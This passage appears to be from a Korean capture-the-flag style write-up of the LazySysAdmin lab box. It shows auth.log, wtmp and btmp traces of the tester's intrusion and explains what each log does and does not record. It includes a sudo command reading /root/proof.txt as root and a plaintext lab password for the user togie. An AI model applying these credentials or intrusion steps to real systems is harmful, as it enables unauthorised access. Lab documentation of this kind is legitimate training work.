Aug 20 17:43:56 LazySysAdmin sshd[1715]: Connection closed by 192.168.45.207 [preauth]
Aug 20 17:43:57 LazySysAdmin sshd[1718]: Connection closed by 192.168.45.207 [preauth]
===AUTHLOG_TAIL===
Aug 20 18:22:04 LazySysAdmin sshd[3464]: Received disconnect from 192.168.45.207: 11: disconnected by user
Aug 20 18:22:04 LazySysAdmin sshd[3416]: pam_unix(sshd:session): session closed for user togie
Aug 20 18:22:33 LazySysAdmin sshd[3466]: Accepted password for togie from 192.168.45.207 port 53112 ssh2
Aug 20 18:22:33 LazySysAdmin sshd[3466]: pam_unix(sshd:session): session opened for user togie by (uid=0)
Aug 20 18:22:33 LazySysAdmin sudo:    togie : TTY=unknown ; PWD=/home/togie ; USER=root ; COMMAND=/bin/sh -c echo ===AUTHLOG_COUNT===; grep -c 192.168.45.207 /var/log/auth.log; echo ===AUTHLOG_SAMPLE===; grep 192.168.45.207 /var/log/auth.log | head -6; echo ===AUTHLOG_TAIL===; tail -6 /var/log/auth.log; echo ===SUDO_LINES===; grep -c "sudo:.*togie" /var/log/auth.log; grep "sudo:.*togie" /var/log/auth.log | head -3; echo ===LAST_WTMP===; last -a | head -10; echo ===BTMP===; lastb -a 2>/dev/null | head -5; echo ===BASH_HISTORY===; ls -la /home/togie/.bash_history; wc -c /home/togie/.bash_history; echo ===HISTCONTENT===; cat -A /home/togie/.bash_history | head -5; echo ===END===
Aug 20 18:22:33 LazySysAdmin sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
===SUDO_LINES===
14
Aug 20 17:45:34 LazySysAdmin sudo:    togie : a password is required ; TTY=unknown ; PWD=/home/togie ; USER=root ; COMMAND=list
Aug 20 17:45:40 LazySysAdmin sudo:    togie : TTY=unknown ; PWD=/home/togie ; USER=root ; COMMAND=list
Aug 20 17:45:50 LazySysAdmin sudo:    togie : TTY=pts/0 ; PWD=/home/togie ; USER=root ; COMMAND=/bin/bash -c bash -c whoami;\ id;\ hostname;\ hostname\ -I;\ date;\ ls\ -la\ /root;\ cat\ /root/proof.txt
===LAST_WTMP===
togie    pts/0        Thu Aug 20 17:45 - 17:45  (00:00)     192.168.45.207
togie    pts/0        Thu Aug 20 17:45 - 17:45  (00:00)     192.168.45.207
reboot   system boot  Sun Aug  4 03:55 - 18:22 (746+14:26)  4.4.0-31-generic
root     tty1         Thu Jul  9 22:34 - down   (00:17)     
reboot   system boot  Thu Jul  9 22:33 - 22:51  (00:17)     4.4.0-31-generic

wtmp begins Thu Jul  9 22:33:51 2020
===BTMP===
togie    ssh:notty    Thu Aug 20 17:47 - 17:47  (00:00)     192.168.45.207

btmp begins Thu Aug 20 17:47:14 2026
===BASH_HISTORY===
-rw------- 1 togie togie 0 Mar  5  2020 /home/togie/.bash_history
0 /home/togie/.bash_history
===HISTCONTENT===
===END===
```
— 출처: `~/PG/LazySysAdmin/traces_confirmed.log`

`sudo` 는 실행 명령을 `COMMAND=` 에 인자까지 통째로 남김 — 17:45:50 행에 `cat /root/proof.txt` 가 그대로 있음. `wtmp` 의 `togie pts/0` 는 2건뿐(둘 다 17:45, `-tt` 로 플래그를 읽은 그 두 번) — 비대화형 `ssh <cmd>` 는 pty 를 안 열어 `wtmp` 에 안 남음. `btmp` 실패 로그인 1건(17:47)은 `togie:TogieMYSQL12345^^` SSH 시도(Initial Access 절 대체 경로 참고). `~togie/.bash_history` 는 0바이트(mtime 2020-03-05) — 명령이 한 줄도 안 들어감(비대화형이었기 때문).

이 흔적 확인 작업 자체가 `auth.log` 에 `sudo` 2행을 더 얹었음(위 `AUTHLOG_TAIL` 의 18:22:33 항목) — `68`·`14` 는 이 확인 실행분을 포함한 숫자.

**확인하지 않은 것(관측 없음):** Apache 액세스 로그(`/var/log/apache2/access.log`)의 SMB 무관 웹 요청 기록, Samba 로그(`/var/log/samba/`)의 널 세션·`recurse ON; ls` 기록, MySQL 1130 거부 기록.

## 관련

- GTFOBins — 제한 셸 탈출 참고: https://gtfobins.github.io/#+shell
- `rpcclient` SID 네임스페이스: Samba 의 `S-1-22-1-<uid>` = Unix 사용자, `S-1-22-2-<gid>` = Unix 그룹
- 이 박스는 VulnHub 의 LazySysAdmin 1.0 을 PG 가 재포장한 것 — 원판과 달리 `togie` 의 셸이 `/bin/rbash`, 플래그가 `local.txt`/`proof.txt` 로 바뀜
- [[Sorcerer]] — 같은 "접속은 되는데 셸이 갇혀 있다" 부류. 저쪽은 `authorized_keys` 의 `command=` 강제 명령, 이쪽은 `/etc/passwd` 의 `rbash`
- [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] — `id` 의 보조 그룹을 `sudo -S -l` 재확인의 트리거로 쓴 사례
- 이 박스의 시행착오·반사 카드 — [[_PLAYBOOK#A-36. 제한 셸(rbash)에 떨어졌다]] · [[_PLAYBOOK#A-37. rbash 대상에 `scp` 가 조용히 끊긴다]] · [[_PLAYBOOK#A-1-12. 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다]] · MySQL 에러 1130/1045 구분은 [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] · WordPress 302/200 판정은 [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · `grep` 문맥 패턴 오판은 [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]]
- 기법 카드 — [[_PLAYBOOK#B-27. 익명으로 열리는 SMB 공유 — `path` 가 웹루트인지부터 본다]] · [[_PLAYBOOK#B-28. `enum4linux -U` 가 비면 `rpcclient` 로 `S-1-22-1-<uid>` 를 역조회한다]]
- [[_STATUS]] — 283개 전수 진행현황
